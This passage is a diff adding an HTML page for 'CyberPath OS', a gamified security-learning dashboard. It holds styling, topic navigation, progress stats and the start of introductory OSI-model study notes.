@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberPath OS — 0 to 100 Security Roadmap</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#0a0d12;--bg2:#0f1318;--bg3:#141920;
+  --border:#1e2840;--border2:#253050;
+  --text:#c8d4e8;--text2:#7a8fa8;--text3:#4a5a70;
+  --accent:#00d4ff;--glow:rgba(0,212,255,0.15);
+  --green:#00ff88;--orange:#ff8c42;--red:#ff4757;--purple:#a855f7;--yellow:#ffd700;
+  --bnav-h:60px;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.025) 2px,rgba(0,0,0,0.025) 4px);pointer-events:none;z-index:9998}
+
+/* HEADER */
+.header{background:linear-gradient(90deg,#0a0d12,#0f1318,#0a0d12);border-bottom:1px solid var(--border2);padding:12px 16px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:200;backdrop-filter:blur(20px)}
+.logo{font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:var(--accent);text-shadow:0 0 20px rgba(0,212,255,0.5);letter-spacing:2px}
+.logo span{color:var(--green)}
+.hbadge{background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:20px;padding:3px 9px;font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--accent);letter-spacing:1px}
+.hright{margin-left:auto;display:flex;align-items:center;gap:8px}
+.lvl-badge{background:var(--bg3);border:1px solid var(--border2);border-radius:8px;padding:4px 10px;font-size:11px;font-family:'JetBrains Mono',monospace}
+.lvl-badge span{color:var(--accent);font-weight:700}
+
+/* HAMBURGER — mobile only */
+.hamburger{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px;border-radius:6px;border:1px solid var(--border2);background:var(--bg3)}
+.hamburger span{display:block;width:18px;height:2px;background:var(--text2);border-radius:1px;transition:all .25s}
+.hamburger.open span:nth-child(1){transform:translateY(6px) rotate(45deg)}
+.hamburger.open span:nth-child(2){opacity:0}
+.hamburger.open span:nth-child(3){transform:translateY(-6px) rotate(-45deg)}
+
+/* LAYOUT — desktop: sidebar + main */
+.container{display:grid;grid-template-columns:250px 1fr;min-height:calc(100vh - 53px)}
+
+/* SIDEBAR — desktop */
+.sidebar{background:var(--bg2);border-right:1px solid var(--border);padding:12px 0;position:sticky;top:53px;height:calc(100vh - 53px);overflow-y:auto;transition:transform .3s ease}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.nsec{padding:8px 16px 3px;font-size:10px;letter-spacing:2px;color:var(--text3);font-weight:600;text-transform:uppercase;font-family:'JetBrains Mono',monospace}
+.ni{display:flex;align-items:center;gap:9px;padding:9px 18px;cursor:pointer;transition:all .2s;border-left:2px solid transparent;font-size:12px;font-family:'JetBrains Mono',monospace;color:var(--text2);min-height:40px}
+.ni:hover{background:rgba(0,212,255,0.05);color:var(--text);border-left-color:var(--border2)}
+.ni.active{background:rgba(0,212,255,0.08);color:var(--accent);border-left-color:var(--accent)}
+.ndot{width:7px;height:7px;border-radius:50%;background:var(--border2);flex-shrink:0;transition:all .2s}
+.ni.active .ndot,.ni:hover .ndot{background:var(--accent);box-shadow:0 0 8px rgba(0,212,255,0.5)}
+.nprog{margin:2px 18px 0 34px;height:2px;background:var(--border);border-radius:1px;overflow:hidden}
+.npf{height:100%;background:var(--accent);border-radius:1px;transition:width .5s}
+.sxp{padding:14px 18px;border-top:1px solid var(--border);margin-top:8px}
+.sxp-lbl{font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-bottom:7px;display:flex;justify-content:space-between}
+.sxp-bar{height:5px;background:var(--border);border-radius:3px;overflow:hidden}
+.sxp-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--green),var(--accent));transition:width .8s cubic-bezier(.4,0,.2,1)}
+
+/* MAIN */
+.main{background:var(--bg);overflow-y:auto;min-width:0}
+.view{display:none;padding:20px 18px;animation:fadeIn .3s ease}
+.view.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+/* SECTION HEADER */
+.sh{margin-bottom:20px}
+.st{font-size:10px;letter-spacing:3px;color:var(--text3);font-family:'JetBrains Mono',monospace;text-transform:uppercase;margin-bottom:5px}
+.stitle{font-size:22px;font-weight:800;line-height:1.15;margin-bottom:7px}
+.sdesc{color:var(--text2);font-size:13px;line-height:1.65}
+
+/* STATS */
+.srow{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:18px}
+.sc{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:12px;position:relative;overflow:hidden}
+.sc::before{content:'';position:absolute;inset:0;opacity:0;background:var(--glow);transition:opacity .3s}
+.sc:hover::before{opacity:1}
+.slbl{font-size:9px;color:var(--text3);letter-spacing:1.5px;text-transform:uppercase;font-family:'JetBrains Mono',monospace;margin-bottom:4px}
+.sval{font-size:20px;font-weight:800;font-family:'JetBrains Mono',monospace;color:var(--accent)}
+.ssub{font-size:10px;color:var(--text2);margin-top:2px}
+
+/* OVERALL PROGRESS */
+.op{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px 18px;margin-bottom:18px}
+.oph{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.opt{font-weight:700;font-size:13px}
+.opp{font-family:'JetBrains Mono',monospace;font-size:18px;font-weight:800;color:var(--green)}
+.opbar{height:10px;background:var(--border);border-radius:5px;overflow:hidden;position:relative}
+.opfill{height:100%;border-radius:5px;background:linear-gradient(90deg,#00ff88,#00d4ff,#a855f7);transition:width 1s cubic-bezier(.4,0,.2,1);position:relative}
+.opfill::after{content:'';position:absolute;right:0;top:0;bottom:0;width:3px;background:white;border-radius:2px;animation:pulse 1.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.opms{display:flex;justify-content:space-between;margin-top:7px}
+.ms{font-size:8px;color:var(--text3);font-family:'JetBrains Mono',monospace;text-align:center}
+.ms.reached{color:var(--green)}
+
+/* CHARTS */
+.crow{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px}
+.cc{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px}
+.cct{font-size:13px;font-weight:700;margin-bottom:12px}
+
+/* ACTIVITY */
+.act{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:18px}
+.actt{font-size:13px;font-weight:700;margin-bottom:12px}
+.ai{display:flex;align-items:flex-start;gap:10px;padding:10px 0;border-bottom:1px solid var(--border)}
+.ai:last-child{border-bottom:none}
+.adot{width:7px;height:7px;border-radius:50%;flex-shrink:0;margin-top:4px}
+.adot.g{background:var(--green);box-shadow:0 0 5px rgba(0,255,136,0.5)}
+.adot.b{background:var(--accent);box-shadow:0 0 5px rgba(0,212,255,0.5)}
+.adot.o{background:var(--orange);box-shadow:0 0 5px rgba(255,140,66,0.5)}
+.atxt{flex:1;font-size:12px;color:var(--text2);line-height:1.5}
+.atxt strong{color:var(--text);font-weight:600}
+.atime{font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace;white-space:nowrap}
+
+/* HEATMAP */
+.hm{display:flex;flex-direction:column;gap:4px;padding:8px 0;overflow-x:auto}
+.hmr{display:flex;gap:3px;align-items:center}
+.hml{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;width:18px;text-align:right;flex-shrink:0}
+.hmc{width:12px;height:12px;border-radius:2px;background:var(--border);cursor:pointer;transition:all .2s;flex-shrink:0}
+.hmc:active{transform:scale(1.3)}
+.hmc.l1{background:rgba(0,212,255,0.2)}
+.hmc.l2{background:rgba(0,212,255,0.45)}
+.hmc.l3{background:rgba(0,212,255,0.7)}
+.hmc.l4{background:var(--accent)}
+
+/* STUDY PANEL */
+.sp{background:var(--bg2);border:1px solid var(--border2);border-radius:14px;overflow:hidden;margin-bottom:18px}
+.sph{display:flex;align-items:center;gap:10px;padding:13px 16px;border-bottom:1px solid var(--border);background:var(--bg3);flex-wrap:wrap;gap:8px}
+.spi{font-size:16px}
+.spn{font-size:13px;font-weight:700}
+.spb{margin-left:auto;font-size:10px;font-family:'JetBrains Mono',monospace;padding:3px 10px;border-radius:20px;background:rgba(0,212,255,0.1);color:var(--accent);border:1px solid rgba(0,212,255,0.25);white-space:nowrap}
+.spb.done{background:rgba(0,255,136,0.12);color:var(--green);border-color:rgba(0,255,136,0.3)}
+.sptabs{display:flex;border-bottom:1px solid var(--border);background:var(--bg3);overflow-x:auto}
+.sptab{padding:10px 14px;font-size:11px;cursor:pointer;color:var(--text2);font-family:'JetBrains Mono',monospace;border-bottom:2px solid transparent;transition:all .2s;white-space:nowrap;min-height:40px;display:flex;align-items:center}
+.sptab:hover{color:var(--text)}
+.sptab.active{color:var(--accent);border-bottom-color:var(--accent)}
+.spbody{padding:16px;max-height:none;overflow-y:visible}
+
+/* NOTES */
+.nb{margin-bottom:18px}
+.nbc{font-size:9px;letter-spacing:2px;color:var(--accent);text-transform:uppercase;font-family:'JetBrains Mono',monospace;margin-bottom:7px}
+.nbt{font-size:14px;font-weight:700;margin-bottom:7px;display:flex;align-items:center;gap:7px;flex-wrap:wrap}
+.tag{font-size:9px;padding:2px 7px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-weight:400}
+.tag.crit{background:rgba(255,71,87,0.15);color:var(--red);border:1px solid rgba(255,71,87,0.3)}
+.tag.key{background:rgba(255,215,0,0.1);color:var(--yellow);border:1px solid rgba(255,215,0,0.3)}
+.nbd{font-size:13px;line-height:1.85;color:var(--text2)}
+.nbd code{background:rgba(0,212,255,0.1);color:var(--accent);padding:2px 7px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:11px;word-break:break-all}
+.nbd strong{color:var(--text);font-weight:600}
+
+/* CMD BLOCK */
+.cmd{background:rgba(0,0,0,0.4);border:1px solid var(--border2);border-radius:8px;padding:12px 14px;padding-top:34px;margin:10px 0;font-family:'JetBrains Mono',monospace;font-size:11px;position:relative;overflow-x:auto}
+.pr{color:var(--green);user-select:none}
+.cl{margin:3px 0;color:var(--text);word-break:break-all}
+.cm{color:var(--text3)}
+.cpbtn{position:absolute;top:7px;right:8px;font-size:10px;color:var(--text3);cursor:pointer;padding:4px 10px;border-radius:4px;border:1px solid var(--border);background:var(--bg3);transition:all .2s;font-family:'JetBrains Mono',monospace;min-height:28px}
+.cpbtn:active{color:var(--accent);border-color:rgba(0,212,255,0.3)}
+
+/* RESOURCES */
+.rl{margin:10px 0}
+.ri{display:flex;align-items:center;gap:9px;padding:12px 11px;background:rgba(255,255,255,0.03);border-radius:8px;margin-bottom:6px;border:1px solid var(--border);cursor:pointer;transition:all .2s;min-height:52px}
+.ri:active{background:rgba(0,212,255,0.06);border-color:rgba(0,212,255,0.2)}
+.rii{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
+.rii.yt{background:rgba(255,71,87,0.15)}
+.rii.bk{background:rgba(168,85,247,0.15)}
+.rii.tl{background:rgba(0,212,255,0.1)}
+.rii.wb{background:rgba(0,255,136,0.1)}
+.rin{font-size:12px;font-weight:600;color:var(--text)}
+.ris{font-size:11px;color:var(--text3)}
+.rib{margin-left:auto;font-size:9px;font-family:'JetBrains Mono',monospace;padding:2px 7px;border-radius:4px;background:rgba(255,255,255,0.06);color:var(--text2);white-space:nowrap;flex-shrink:0}
+.rib.free{background:rgba(0,255,136,0.1);color:var(--green)}
+.rib.paid{background:rgba(255,140,66,0.1);color:var(--orange)}
+
+/* COMPLETE BTN */
+.cbtn{display:flex;align-items:center;justify-content:center;gap:7px;padding:14px 18px;border-radius:10px;font-size:13px;font-family:'JetBrains Mono',monospace;cursor:pointer;border:1px solid rgba(0,255,136,0.3);background:rgba(0,255,136,0.08);color:var(--green);transition:all .2s;font-weight:600;margin-top:10px;width:100%;text-align:center;min-height:48px}
+.cbtn:active{background:rgba(0,255,136,0.18);transform:scale(0.98)}
+.cbtn.done{cursor:pointer;border-color:var(--green);background:rgba(0,255,136,0.15);opacity:0.85}
+.cbtn.done:hover{opacity:1;background:rgba(255,71,87,0.1);border-color:rgba(255,71,87,0.4);color:var(--red)}
+
+/* ROADMAP */
+.rmtier{margin-bottom:22px}
+.rmth{display:flex;align-items:center;gap:11px;margin-bottom:13px;padding:10px 15px;border-radius:10px}
+.rmth.b{background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.15)}
+.rmth.m{background:rgba(168,85,247,0.06);border:1px solid rgba(168,85,247,0.15)}
+.rmth.a{background:rgba(255,71,87,0.06);border:1px solid rgba(255,71,87,0.15)}
+.rmtt{font-size:13px;font-weight:700}
+.rmtr{font-size:10px;font-family:'JetBrains Mono',monospace;margin-left:auto;padding:3px 10px;border-radius:20px;white-space:nowrap}
+.b .rmtr{background:rgba(0,212,255,0.1);color:var(--accent)}
+.m .rmtr{background:rgba(168,85,247,0.1);color:var(--purple)}
+.a .rmtr{background:rgba(255,71,87,0.1);color:var(--red)}
+.rmnodes{display:flex;flex-direction:column;padding-left:14px}
+.rmn{display:flex;align-items:flex-start;gap:12px;position:relative;padding:11px 10px 11px 0;cursor:pointer}
+.rmn::before{content:'';position:absolute;left:-14px;top:0;bottom:0;width:1px;background:var(--border)}
+.rmn:last-child::before{background:linear-gradient(to bottom,var(--border),transparent)}
+.rmnd{width:9px;height:9px;border-radius:50%;flex-shrink:0;margin-top:4px;border:2px solid var(--border2);background:var(--bg2);transition:all .2s;z-index:1}
+.rmn.done .rmnd{background:var(--green);border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.5)}
+.rmn.cur .rmnd{background:var(--accent);border-color:var(--accent);box-shadow:0 0 8px rgba(0,212,255,0.5);animation:blink 1.5s ease-in-out infinite}
+@keyframes blink{0%,100%{box-shadow:0 0 8px rgba(0,212,255,0.5)}50%{box-shadow:0 0 16px rgba(0,212,255,0.9)}}
+.rmnb{flex:1}
+.rmntitle{font-size:13px;font-weight:600;margin-bottom:3px}
+.rmn.done .rmntitle{color:var(--text2);text-decoration:line-through;text-decoration-color:rgba(0,255,136,0.4)}
+.rmnsub{font-size:11px;color:var(--text3);line-height:1.4}
+.rmnck{width:24px;height:24px;border-radius:6px;border:1px solid var(--border2);background:var(--bg3);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .2s;margin-top:1px;font-size:12px}
+.rmnck:active{border-color:rgba(0,255,136,0.4);background:rgba(0,255,136,0.06)}
+.rmnck.chk{background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.5);color:var(--green)}
+
+/* CAREER */
+.cg{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-bottom:22px}
+.ccard{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:18px;position:relative;overflow:hidden}
+.ccard.hl{border-color:rgba(0,255,136,0.3);background:rgba(0,255,136,0.025)}
+.ccard.hl::after{content:'★ YOUR PATH';position:absolute;top:11px;right:11px;font-size:9px;font-family:'JetBrains Mono',monospace;letter-spacing:1px;background:rgba(0,255,136,0.15);color:var(--green);padding:3px 8px;border-radius:20px;border:1px solid rgba(0,255,136,0.3)}
+
+/* BOTTOM NAV — mobile only, hidden on desktop */
+.bnav{display:none;position:fixed;bottom:0;left:0;right:0;z-index:300;background:var(--bg2);border-top:1px solid var(--border2);height:var(--bnav-h);backdrop-filter:blur(20px)}
+.bnav-inner{display:flex;height:100%}
+.bni{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;cursor:pointer;padding:8px 4px;border:none;background:transparent;color:var(--text3);font-family:'JetBrains Mono',monospace;font-size:9px;letter-spacing:0.5px;transition:all .15s}
+.bni:active{background:rgba(0,212,255,0.06)}
+.bni.active{color:var(--accent)}
+.bni-icon{font-size:19px;line-height:1}
+
+/* DRAWER OVERLAY */
+.drawer-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:250;backdrop-filter:blur(2px)}
+.drawer-overlay.open{display:block}
+
+/* DRAWER */
+.drawer{position:fixed;bottom:var(--bnav-h);left:0;right:0;z-index:260;background:var(--bg2);border-top:1px solid var(--border2);border-radius:18px 18px 0 0;max-height:75vh;overflow-y:auto;transform:translateY(100%);transition:transform .3s cubic-bezier(.4,0,.2,1)}
+.drawer.open{transform:translateY(0)}
+.drawer-handle{width:36px;height:4px;background:var(--border2);border-radius:2px;margin:12px auto 4px}
+.drawer-section{padding:8px 18px 4px;font-size:9px;letter-spacing:2px;color:var(--text3);font-weight:600;text-transform:uppercase;font-family:'JetBrains Mono',monospace}
+.drawer-item{display:flex;align-items:center;gap:10px;padding:12px 18px;cursor:pointer;border-bottom:1px solid rgba(30,40,64,0.5);min-height:48px;transition:background .15s}
+.drawer-item:active{background:rgba(0,212,255,0.07)}
+.drawer-item.active{background:rgba(0,212,255,0.08)}
+.drawer-item-text{flex:1;font-size:13px;font-family:'JetBrains Mono',monospace;color:var(--text2)}
+.drawer-item.active .drawer-item-text{color:var(--accent)}
+.drawer-prog{margin:0 18px 8px 46px;height:2px;background:var(--border);border-radius:1px;overflow:hidden}
+.drawer-prog-fill{height:100%;background:var(--accent);border-radius:1px}
+
+/* TOAST position */
+.toast{position:fixed;bottom:80px;right:16px;z-index:2000;background:var(--bg3);border:1px solid rgba(0,255,136,0.4);border-radius:10px;padding:11px 16px;font-size:12px;display:none;align-items:center;gap:9px;box-shadow:0 8px 30px rgba(0,0,0,0.5);font-family:'JetBrains Mono',monospace;max-width:calc(100vw - 32px)}
+.toast.show{display:flex;animation:slideup .3s ease}
+@keyframes slideup{from{transform:translateY(20px);opacity:0}to{transform:none;opacity:1}}
+
+/* PATH/CERT shared */
+.pathbox{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.2);border-radius:12px;padding:16px 18px;margin-bottom:18px}
+.certrow{display:flex;flex-direction:column;gap:9px}
+.certitem{display:flex;align-items:flex-start;gap:11px;font-size:12px}
+.certlvl{width:55px;font-family:'JetBrains Mono',monospace;font-size:9px;flex-shrink:0;padding-top:10px}
+.crole{font-size:14px;font-weight:800;margin-bottom:3px}
+.clvl{font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-bottom:10px}
+.csal{font-size:18px;font-weight:800;color:var(--green);font-family:'JetBrains Mono',monospace;margin-bottom:7px}
+.cwhen{font-size:11px;color:var(--text2);margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.cwhen::before{content:'';display:inline-block;width:5px;height:5px;border-radius:50%;background:var(--orange);flex-shrink:0}
+.cskills{display:flex;flex-wrap:wrap;gap:4px}
+.csk{font-size:9px;font-family:'JetBrains Mono',monospace;padding:2px 7px;border-radius:4px;background:rgba(255,255,255,0.05);color:var(--text2);border:1px solid var(--border)}
+
+/* MOBILE RESPONSIVE */
+@media(max-width:768px){
+  .hbadge{display:none}
+  .container{grid-template-columns:1fr}
+  .sidebar{display:none}
+  .view{padding:14px 13px;padding-bottom:calc(var(--bnav-h) + 16px)}
+  .bnav{display:block}
+  .toast{bottom:calc(var(--bnav-h) + 10px)}
+  .srow{grid-template-columns:1fr 1fr}
+  .sval{font-size:19px}
+  .crow{grid-template-columns:1fr}
+  .cg{grid-template-columns:1fr}
+  .stitle{font-size:18px}
+  .ms{font-size:7px}
+  .cmd{padding-top:36px}
+  .cl{white-space:nowrap}
+  .spbody{max-height:none}
+  .certitem{flex-direction:column;gap:4px}
+  .certlvl{width:auto;padding-top:0}
+  .hm{overflow-x:auto}
+  .hmr{min-width:max-content}
+  .ccard.hl::after{font-size:8px;padding:2px 7px;top:8px;right:8px}
+}
+@media(min-width:769px){
+  .toast{bottom:22px;right:22px}
+}
+.crole{font-size:14px;font-weight:800;margin-bottom:3px}
+.clvl{font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-bottom:10px}
+.csal{font-size:18px;font-weight:800;color:var(--green);font-family:'JetBrains Mono',monospace;margin-bottom:7px}
+.cwhen{font-size:11px;color:var(--text2);margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.cwhen::before{content:'';display:inline-block;width:5px;height:5px;border-radius:50%;background:var(--orange);flex-shrink:0}
+.cskills{display:flex;flex-wrap:wrap;gap:4px}
+.csk{font-size:9px;font-family:'JetBrains Mono',monospace;padding:2px 7px;border-radius:4px;background:rgba(255,255,255,0.05);color:var(--text2);border:1px solid var(--border)}
+
+/* TOAST */
+.toast{position:fixed;bottom:22px;right:22px;z-index:2000;background:var(--bg3);border:1px solid rgba(0,255,136,0.4);border-radius:10px;padding:11px 18px;font-size:12px;display:none;align-items:center;gap:9px;box-shadow:0 8px 30px rgba(0,0,0,0.5);font-family:'JetBrains Mono',monospace}
+.toast.show{display:flex;animation:slideup .3s ease}
+@keyframes slideup{from{transform:translateY(20px);opacity:0}to{transform:none;opacity:1}}
+
+/* PATH HIGHLIGHT */
+.pathbox{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.2);border-radius:12px;padding:16px 18px;margin-bottom:22px}
+.certrow{display:flex;flex-direction:column;gap:9px}
+.certitem{display:flex;align-items:center;gap:11px;font-size:12px}
+.certlvl{width:55px;font-family:'JetBrains Mono',monospace;font-size:9px;flex-shrink:0}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">CYBER<span>PATH</span>.OS</div>
+  <div class="hbadge">v2.1</div>
+  <div class="hright">
+    <div class="lvl-badge">Level <span id="cur-level">12</span></div>
+    <div class="lvl-badge" style="color:var(--green)"><span id="xp-disp">2,840</span> XP</div>
+  </div>
+</div>
+
+<div class="container">
+<div class="sidebar">
+  <div class="nsec">Dashboard</div>
+  <div class="ni active" onclick="showView('dashboard',this)"><div class="ndot"></div>Overview</div>
+  <div class="ni" onclick="showView('roadmap',this)"><div class="ndot"></div>Full Roadmap</div>
+
+  <div class="nsec" style="margin-top:8px">Beginner · 0–30</div>
+  <div class="ni" onclick="showView('beg1',this)"><div class="ndot"></div>OSI / TCP-IP<span style="margin-left:auto;font-size:9px;color:var(--green)">✓</span></div>
+  <div class="nprog"><div class="npf" style="width:100%"></div></div>
+  <div class="ni" onclick="showView('beg2',this)"><div class="ndot"></div>Linux & Kali</div>
+  <div class="nprog"><div class="npf" style="width:75%"></div></div>
+  <div class="ni" onclick="showView('beg3',this)"><div class="ndot"></div>Nmap & Recon</div>
+  <div class="nprog"><div class="npf" style="width:60%"></div></div>
+  <div class="ni" onclick="showView('beg4',this)"><div class="ndot"></div>Burp & OWASP</div>
+  <div class="nprog"><div class="npf" style="width:40%"></div></div>
+  <div class="ni" onclick="showView('beg5',this)"><div class="ndot"></div>SQLi & XSS</div>
+  <div class="nprog"><div class="npf" style="width:20%"></div></div>
+
+  <div class="nsec" style="margin-top:8px">Intermediate · 30–60</div>
+  <div class="ni" onclick="showView('mid1',this)"><div class="ndot"></div>Metasploit</div>
+  <div class="nprog"><div class="npf" style="width:10%"></div></div>
+  <div class="ni" onclick="showView('mid2',this)"><div class="ndot"></div>Privilege Escalation</div>
+  <div class="nprog"><div class="npf" style="width:0%"></div></div>
+  <div class="ni" onclick="showView('mid3',this)"><div class="ndot"></div>Active Directory</div>
+  <div class="nprog"><div class="npf" style="width:0%"></div></div>
+  <div class="ni" onclick="showView('mid4',this)"><div class="ndot"></div>Malware & SIEM</div>
+  <div class="nprog"><div class="npf" style="width:0%"></div></div>
+
+  <div class="nsec" style="margin-top:8px">Advanced · 60–100</div>
+  <div class="ni" onclick="showView('adv1',this)"><div class="ndot"></div>Red Teaming & OSCP</div>
+  <div class="ni" onclick="showView('adv2',this)"><div class="ndot"></div>EDR Evasion</div>
+  <div class="ni" onclick="showView('adv3',this)"><div class="ndot"></div>Cloud Security</div>
+  <div class="ni" onclick="showView('adv4',this)"><div class="ndot"></div>0-Day & CVE Research</div>
+
+  <div class="nsec" style="margin-top:8px">Career</div>
+  <div class="ni" onclick="showView('jobs',this)"><div class="ndot"></div>Internships & Jobs</div>
+
+  <div class="sxp">
+    <div class="sxp-lbl"><span>Overall XP</span><span id="xp-pct-s">28%</span></div>
+    <div class="sxp-bar"><div class="sxp-fill" id="xp-bar-s" style="width:28%"></div></div>
+  </div>
+</div>
+
+<div class="main">
+
+<!-- DASHBOARD -->
+<div class="view active" id="view-dashboard">
+  <div class="sh"><div class="st">// command center</div><div class="stitle">Your CyberPath Dashboard</div><div class="sdesc">Track your journey from 0 to security professional. Complete topics, earn XP, and level up your skills.</div></div>
+
+  <div class="srow">
+    <div class="sc"><div class="slbl">Level</div><div class="sval" id="s-lvl">12</div><div class="ssub">Intermediate</div></div>
+    <div class="sc"><div class="slbl">Topics Done</div><div class="sval" style="color:var(--green)" id="s-done">3</div><div class="ssub">of 24 topics</div></div>
+    <div class="sc"><div class="slbl">Streak</div><div class="sval" style="color:var(--orange)">7</div><div class="ssub">days active</div></div>
+    <div class="sc"><div class="slbl">XP Earned</div><div class="sval" style="color:var(--purple)" id="s-xp">2,840</div><div class="ssub">next: 3,200</div></div>
+  </div>
+
+  <div class="op">
+    <div class="oph"><div class="opt">Journey: 0 → 100</div><div class="opp" id="op-pct">28%</div></div>
+    <div class="opbar"><div class="opfill" id="op-fill" style="width:28%"></div></div>
+    <div class="opms">
+      <div class="ms reached">0<br><span style="font-size:8px">Start</span></div>
+      <div class="ms reached">20<br><span style="font-size:8px">SOC</span></div>
+      <div class="ms">30<br><span style="font-size:8px">eJPT</span></div>
+      <div class="ms">50<br><span style="font-size:8px">Bounty</span></div>
+      <div class="ms">70<br><span style="font-size:8px">OSCP</span></div>
+      <div class="ms">85<br><span style="font-size:8px">AppSec</span></div>
+      <div class="ms">100<br><span style="font-size:8px">Elite</span></div>
+    </div>
+  </div>
+
+  <div class="crow">
+    <div class="cc"><div class="cct">Skill Radar</div><div style="position:relative;height:200px"><canvas id="radarChart" role="img" aria-label="Skill radar chart">Skill radar</canvas></div></div>
+    <div class="cc"><div class="cct">XP by Tier</div><div style="position:relative;height:200px"><canvas id="barChart" role="img" aria-label="XP bar chart">XP chart</canvas></div></div>
+  </div>
+
+  <div class="act">
+    <div class="actt">Recent Activity</div>
+    <div class="ai"><div class="adot g"></div><div class="atxt"><strong>Completed:</strong> OSI Model & TCP/IP — earned 200 XP</div><div class="atime">Today</div></div>
+    <div class="ai"><div class="adot b"></div><div class="atxt"><strong>In Progress:</strong> Linux Fundamentals — 75% complete</div><div class="atime">Yesterday</div></div>
+    <div class="ai"><div class="adot o"></div><div class="atxt"><strong>Milestone:</strong> Reached Level 12 — Intermediate badge unlocked</div><div class="atime">3 days ago</div></div>
+    <div class="ai"><div class="adot g"></div><div class="atxt"><strong>Completed:</strong> Networking Basics Module — earned 150 XP</div><div class="atime">5 days ago</div></div>
+    <div class="ai"><div class="adot b"></div><div class="atxt"><strong>Resource:</strong> TryHackMe Pre-Security — 8 rooms completed</div><div class="atime">1 week ago</div></div>
+  </div>
+
+  <div class="cc" style="margin-bottom:22px">
+    <div class="cct">Study Activity — Last 12 Weeks</div>
+    <div class="hm" id="heatmap"></div>
+  </div>
+</div>
+
+<!-- ROADMAP -->
+<div class="view" id="view-roadmap">
+  <div class="sh"><div class="st">// learning path</div><div class="stitle">Full Roadmap · 0 to 100</div><div class="sdesc">Check off topics as you complete them. Your XP and progress update automatically.</div></div>
+  <div id="rm-root"></div>
+</div>
+
+<!-- BEG 1: OSI -->
+<div class="view" id="view-beg1">
+  <div class="sh"><div class="st">// beginner · level 0–10</div><div class="stitle">OSI Model & TCP/IP Stack</div><div class="sdesc">The absolute foundation of all networking and security knowledge. Every attack traces back to these layers.</div></div>
+  <div class="sp">
+    <div class="sph"><span class="spi">📡</span><div class="spn">Study Notes</div><div class="spb done">COMPLETED</div></div>
+    <div class="sptabs">
+      <div class="sptab active" onclick="st(this,'t-osi-n')">Core Notes</div>
+      <div class="sptab" onclick="st(this,'t-osi-c')">Commands</div>
+      <div class="sptab" onclick="st(this,'t-osi-r')">Resources</div>
+    </div>
+    <div class="spbody" id="t-osi-n">
+      <div class="nb"><div class="nbc">OSI Model</div><div class="nbt">7 Layers — The Foundation <span class="tag key">must know</span></div><div class="nbd">The OSI model splits network communication into <strong>7 abstract layers</strong>. Attacks target specific layers.<br><br><strong>L7 Application</strong> — HTTP, DNS, FTP. XSS, SQLi, SSRF live here.<br><strong>L6 Presentation</strong> — Encryption/encoding (SSL/TLS, base64).<br><strong>L5 Session</strong> — Session management. Session hijacking happens here.<br><strong>L4 Transport</strong> — TCP/UDP. Port scanning, SYN floods target this.<br><strong>L3 Network</strong> — IP routing. ARP spoofing, IP spoofing.<br><strong>L2 Data Link</strong> — MAC addresses. VLAN hopping.<br><strong>L1 Physical</strong> — Cables, NICs. Physical access attacks.</div></div>
